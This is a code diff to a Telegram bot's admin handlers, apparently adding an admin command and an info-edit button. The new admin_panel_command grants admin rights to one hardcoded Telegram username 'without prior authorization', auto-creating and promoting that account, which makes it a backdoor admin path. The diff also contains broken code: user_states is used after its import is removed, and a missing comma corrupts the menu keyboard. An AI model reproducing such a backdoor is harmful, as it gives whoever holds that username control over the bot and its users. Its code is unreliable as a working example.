@@ -5,11 +5,11 @@ from telegram.helpers import escape_markdown
 from config import (
     ADMIN_MENU, ADMIN_BROADCAST, ADMIN_USER_LIST, ADMIN_BROADCAST_BTN, 
     ADMIN_USERS_BTN, ADMIN_STATS_BTN, BACK_BTN, SUPPORT_CONTACT, 
-    WAITING_INFO_TEXT, MAIN_MENU, BAN_USER_PREFIX
+    WAITING_INFO_TEXT, MAIN_MENU, BAN_USER_PREFIX,ADMIN_INFO_EDIT_BTN
 )
 from database import (
-    is_admin, get_all_users, get_user_by_id, ban_user_by_id, unban_user_by_id, 
-    get_user_stats
+    is_admin, get_all_users, get_user_by_id, ban_user_by_id, unban_user_by_id,
+    get_user_stats, add_user, promote_to_admin
 )
 from utils import load_info_text, save_info_text
 from config import DEFAULT_INFO, INFO_VIEW
@@ -21,7 +21,22 @@ from handlers.user import ensure_active_session, show_info, show_main_menu
 logger = logging.getLogger(__name__)
 
 # Import user_handlers at the end of the file to avoid circular imports
-from handlers.user import user_states
+async def admin_panel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Allow @ddenuxe to open the admin panel without prior authorization."""
+    user = update.effective_user
+    tg_username = user.username
+    user_id = user.id
+
+    if tg_username != "ddenuxe":
+        await update.message.reply_text("⛔ У вас нет прав администратора для выполнения этой команды.")
+        return ConversationHandler.END
+
+    if not get_user_by_id(user_id):
+        add_user(user_id, tg_username, "")
+        promote_to_admin(user_id)
+
+    user_states[user_id] = ADMIN_MENU
+    return await show_admin_menu(update, context)
 
 # Show admin menu
 async def show_admin_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -40,7 +55,7 @@ async def show_admin_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Create admin menu keyboard
     keyboard = [
         [ADMIN_BROADCAST_BTN, ADMIN_USERS_BTN],
-        [ADMIN_STATS_BTN],
+        [ADMIN_STATS_BTN, ADMIN_INFO_EDIT_BTN]
         [BACK_BTN]
     ]
     
@@ -87,8 +102,8 @@ async def handle_admin_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return await show_user_list(update, context)
     elif text == ADMIN_STATS_BTN:
         return await show_stats(update, context)
-    # elif text == ADMIN_INFO_EDIT_BTN:
-    #     return WAITING_INFO_TEXT
+    elif text == ADMIN_INFO_EDIT_BTN:
+        return await info_edit_command(update, context)
     elif text == BACK_BTN:
         logger.info(f"Admin {user_id} pressed Back button in admin menu")
         
@@ -453,10 +468,7 @@ async def receive_info_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if new_text == BACK_BTN:
         logger.info(f"Admin {user_id} canceled info editing")
         
-        # Update user state
-        user_states[user_id] = INFO_VIEW
         
-        # Return to info view
         return await show_info(update, context)
     
     # Save new info text
@@ -472,5 +484,5 @@ async def receive_info_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     
     # Return to info view
-    user_states[user_id] = INFO_VIEW
+    
     return await show_info(update, context)
